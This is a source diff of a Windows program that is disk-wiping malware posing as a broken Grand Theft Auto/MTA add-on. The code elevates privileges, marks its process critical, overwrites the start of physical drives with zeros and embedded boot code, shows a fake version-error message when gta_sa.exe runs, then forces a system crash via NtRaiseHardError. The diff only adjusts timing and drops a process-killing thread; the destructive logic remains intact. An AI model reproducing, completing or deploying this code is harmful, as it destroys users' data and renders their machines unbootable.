@@ -13,8 +13,6 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
 
-bool already = false;
-
 const unsigned char bootcode[] = 
 {
 	0x31, 0xC0, 0x8E, 0xC0, 0xBB, 0xD2, 0x04, 0x26, 0x89, 0x1E, 0xD8, 0x01, 0xFA, 0x8E, 0xD8, 0x8E,
@@ -90,25 +88,11 @@ void TerminateProcessName(LPCWSTR lpProcessname)
 	CloseHandle(hProcessSnapshot);
 }
 
-DWORD WINAPI processThread(LPVOID parameter)
-{
-	for (;;)
-	{
-		if (!FindProcess(L"gta_sa.exe"))
-		{
-			TerminateProcessName(L"gta_sa.exe");
-		}
-
-		Sleep(100);
-	}
-
-	return 0;
-}
-
 DWORD WINAPI messageThread(LPVOID parameter)
 {
 	if (FindProcess(L"gta_sa.exe"))
 	{
+		Sleep(2500);
 		MessageBoxA(NULL,
 			"Exception Processing Message 0xc0000135 Parameters\nThis version may not be supported (1.5.9)\nTry with an older verison",
 			"MTA Garbage", MB_OK | MB_ICONERROR);
@@ -134,7 +118,7 @@ void main()
 	RtlAdjustPrivilege(20, TRUE, FALSE, &PrivilegeState);
 
 	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &ErrorResponse + 1, sizeof(ULONG));
-
+	
 	DWORD wb, wbC;
 
 	HANDLE hDrive0 = CreateFileW(
@@ -157,13 +141,14 @@ void main()
 	WriteFile(hDriveC, lpZero, 5120, &wbC, NULL);
 	HeapFree(hHeap, NULL, lpZero);
 	CloseHandle(hDriveC);
-
+	
 	CreateThread(0, 0, &messageThread, 0, 0, 0);
-	CreateThread(0, 0, &processThread, 0, 0, 0);
+	
+	Sleep(15000);
 
-	Sleep((30 * 1000) * 1);
+	PlaySoundW(MAKEINTRESOURCE(IDR_WAVE2), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
 
-	PlaySoundW(MAKEINTRESOURCE(IDR_WAVE1), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
+	Sleep(1000);
 
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &ErrorResponse);
 }
